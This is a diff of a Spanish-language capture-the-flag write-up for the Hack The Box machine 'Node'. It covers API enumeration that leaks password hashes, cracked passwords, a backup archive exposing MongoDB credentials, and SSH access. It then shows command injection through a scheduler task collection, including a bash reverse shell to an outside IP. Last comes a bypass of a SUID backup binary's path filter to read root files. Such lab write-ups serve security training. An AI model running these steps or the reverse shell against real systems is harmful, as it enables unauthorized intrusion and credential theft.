@@ -1,11 +1,14 @@
 # 10.10.10.58 - Node
+![Node](https://user-images.githubusercontent.com/96772264/207566426-66d18b08-c3d5-4732-b434-31dcc9ea91dc.png)
+
 --------------------
+# Part 1: Enumeración
 
 Puertos abiertos 22(ssh), 3000(Apache)
 - La web del puerto 3000 es un Apache Hadoop.
 
-
 Parece una página de red social "MyPlace"
+![node1](https://user-images.githubusercontent.com/96772264/207566493-6a48db0e-1d84-421e-b10d-5191c3f80680.PNG)
 
 ```console
 └─$ wfuzz --hc=404 --hw=249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.58:3000/FUZZ" -t 200
@@ -13,11 +16,13 @@ Parece una página de red social "MyPlace"
 000000278:   301        9 L      15 W       171 Ch      "assets"
 000001468:   301        9 L      15 W       171 Ch      "vendor"
 ```
+--------------------
+# Part 2: Encontrando una api
 
-Al no encontrar nada en el código fuente, en Network al recargar salen más rutas.
-- home.html está en /partials/home.html
-- Muchas peticiones a /assets/js/app/ -> /controllers/profile.js y /controllees/admin.js
-- petición a /api/users/latest -> hay una api
+Al no encontrar nada en el código fuente, en Network al recargar salen más rutas.  
+- home.html está en /partials/home.html  
+- Muchas peticiones a /assets/js/app/ -> /controllers/profile.js y /controllees/admin.js  
+- petición a /api/users/latest -> hay una api  
 
 ```console
   {
@@ -29,23 +34,9 @@ Al no encontrar nada en el código fuente, en Network al recargar salen más rut
   {
     "_id": "59a7368398aa325cc03ee51d",
     "username": "tom",
-    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
-    "is_admin": false
-  },
-  {
-    "_id": "59a7368e98aa325cc03ee51e",
-    "username": "mark",
-    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
-    "is_admin": false
-  },
-  {
-    "_id": "59aa9781cced6f1d1490fce9",
-    "username": "rastating",
-    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
-    "is_admin": false
-  }
+ ...
 ```
-Hacemos fuzzing a la api
+Hacemos fuzzing a la api:   
 ```console
 └─$ wfuzz --hc=404 --hw=249 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.58:3000/api/FUZZ" -t 200
 000000189:   200        0 L      1 W        611 Ch      "users"
@@ -55,17 +46,21 @@ Hacemos fuzzing a la api
 {"authenticated": false}
 ```
 
-Si intento romper los hashes con john y el rockyou no tengo suerte, en la web crackstation utilizan un diccionario
-mucho mas grande 
+Si intento romper los hashes con john y el rockyou no tengo suerte, en la web crackstation utilizan un diccionario mucho mas grande.
 ```
-dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af	sha256	manchester: myP14ceAdm1nAcc0uNT
-f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240	sha256	spongebob: tom
-de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73	sha256	snowflake: mark
-5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0	Unknown	Not found: rastating
+dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af	sha256	manchester: myP14ceAdm1nAcc0uNT  
+f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240	sha256	spongebob: tom  
+de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73	sha256	snowflake: mark  
+5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0	Unknown	Not found: rastating  
 ```
 
-Probamos a registrarnos con myP14ceAdm1nAcc0uNT:manchester en login y es correcto.
-Nos deja descargar el backup, que es un archivo en base64.
+Probamos a registrarnos con myP14ceAdm1nAcc0uNT:manchester en login y es correcto.  
+![node2](https://user-images.githubusercontent.com/96772264/207566613-a3c132e8-ed37-4221-9c79-f52a9074b551.PNG)
+
+--------------------
+# Part 3: Nos descargamos un backup
+
+Nos deja descargar el backup, que es un archivo en base64.  
 ```console
 └─$ cat myplace.backup | base64 -d > myplace
 └─$ file myplace # Zip archive
@@ -75,31 +70,32 @@ Nos deja descargar el backup, que es un archivo en base64.
 └─$ john hash -w=/usr/share/wordlists/rockyou.txt
 magicword        (myplace.backup.zip)
 ```
+El zip tiene carpetas /var/www/myplace y dentro: ```/node_modules  static   app.html   app.js   package-lock.json   package.json```
 
-El zip tiene carpetas /var/www/myplace y dentro:
-/node_modules  static   app.html   app.js   package-lock.json   package.json
+App.js revela una nueva ruta:  
+- "/api/admin/backup" (supongo que de donde se descarga el backup)  
+- "/api/session/authenticate" se encarga del login  
+- Hash para mongo db 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 (ni el cracksation lo rompe)  
+- mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace'  
 
-App.js revela una nueva ruta 
-- "/api/admin/backup" (supongo que de donde se descarga el backup)
-- "/api/session/authenticate" se encarga del login
-- Hash para mongo db 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 (ni el cracksation lo rompe)
-- mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace'
-
-Supongo que el hash sale de esto "5AYRft73VtFpc84k"
+Supongo que el hash sale de esto "5AYRft73VtFpc84k"...
 ```console
 └─$ sshpass -p "5AYRft73VtFpc84k" ssh mark@10.10.10.58;
 ```
+--------------------
+# Part 4: Dentro del sistema, mongodb
 
-Analizo el sistema con mi herramienta
-- Usuarios: mark (nosotros), tom, frank y root
-- SUID: /usr/local/bin/backup -> no podemos ejecutarlo
-- Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian
-- Tom está corriendo con node dos cosas: /var/scheduler/app.js y /var/www/myplace/app.js (lo que bajamos antes)
+Analizo el sistema con mi [herramienta](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh)
+- Usuarios: mark (nosotros), tom, frank y root  
+- SUID: /usr/local/bin/backup -> no podemos ejecutarlo  
+- Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian  
+- Tom está corriendo con node dos cosas: /var/scheduler/app.js y /var/www/myplace/app.js (lo que bajamos antes en el backup)  
 
+En scheduler/app.js llaman la atención estas lienas:  
 ```js
 const url='mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';
-setInterval(function () {
-  db.collection('tasks').find().toArray(function (error, docs) {
+setInterval(function () {  
+  db.collection('tasks').find().toArray(function (error, docs) {  
     if (!error && docs) {
       docs.forEach(function (doc) {
         if (doc) {
@@ -107,10 +103,9 @@ setInterval(function () {
           exec(doc.cmd);
           db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) }); }
 ```
-En mongodb (base de datos nosqli basada en json) a las tablas se le llaman colecciones. En concreto este
-usaurio se puede autenticar la base de datos "scheduler" por lo que pone arriba y acceder a la coleccion "tasks".
-Dentro de esas tablas cada entrada es un "documento". Según el código printea el valor id y ejecuta el valor cmd,
-es decir la estructura sería {"id":1,"cmd":"whoami"}
+En mongodb (base de datos nosqli basada en json) a las tablas se le llaman colecciones. En concreto este usaurio se puede autenticar la base de datos "scheduler" 
+por lo que pone arriba y acceder a la coleccion "tasks". Dentro de esas tablas cada entrada es un "documento". Según el código printea el valor id y ejecuta el 
+valor cmd, es decir la estructura sería ```{"id":1,"cmd":"whoami"}```
 
 ```console
 mark@node:/tmp$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
@@ -122,19 +117,20 @@ tasks
 > db.tasks.insert({"cmd":"ping -c 1 10.10.14.16"})
 # Me llega el ping con "sudo tcpdump -i tun0 icmp -n"
 ```
-Por tanto si hacemos ```> db.tasks.insert({"cmd":"bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'"})``` y
-estamos en escucha con netcat, al poco tiempo recibiremos la shell como Tom.
+Por tanto si hacemos ```> db.tasks.insert({"cmd":"bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'"})``` y si estamos en escucha con netcat, al poco tiempo
+recibiremos la shell como Tom.
 
-Si vemos el archivo app.js
+--------------------
+# Part 5: Ruta absoluta vs ruta relativa
+
+Si vemos el archivo app.js que teniamos de antes nos topamos con el bianrio de altos privilegios que encontramos antes:
 ```
 const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
-
 app.get('/api/admin/backup', function (req, res) {
   if (req.session.user && req.session.user.is_admin) {
     var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
     var backup = '';
 ```
-
 Por tanto como prueba:
 ```
 tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /home/tom/user.txt; echo
@@ -152,9 +148,7 @@ magicword        (root.zip/root.txt)
 
 Lo que nos sale como "root.txt" es una trollface en ascii.
 
-
 Cuando hicimos la prueba con el user.txt no salia este mensaje "[+] Finished! Encoded backup is below:"
-
 Si hacemos un ltrace:
 ```console
 tom@node:/$ ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea703... /root/rootxt
@@ -162,9 +156,9 @@ strstr("/root/root.txt", "..")                                            = nil
 strstr("/root/root.txt", "/root")
 # EL codigo de printear la trollface
 ```
-Es decir si detecta "/root" o ".." te sale la trollface. Habria otras maneras de indicar ese directorio?
-- Probamos con regex como /roo? o /root pero lo mismo.
-- SI ponemos ruta relativa es decir "root" ejecutando el programa desde la raiz nos sale un base64 mucho mas largo
+Es decir si detecta "/root" o ".." te sale la trollface. Habria otras maneras de indicar ese directorio?  
+- Probamos con regex como /roo? o /roo* pero lo mismo.  
+- SI ponemos ruta relativa es decir "root" ejecutando el programa desde la raiz nos sale un base64 mucho mas largo ya que no está el "/"
 
 ```console
 └─$ echo "UEsDBAoAAAAAAMRlEVUA..." | base64 -d > root.zip
@@ -211,7 +205,7 @@ remove("/tmp/.backup_821390232")
 # Hace un zip del directorio que le indiquemos y lo mete en un archivo temporal, que luego printea en base64 y 
 # elimina
 ```
-
+-------------------
 
 # Extra
 
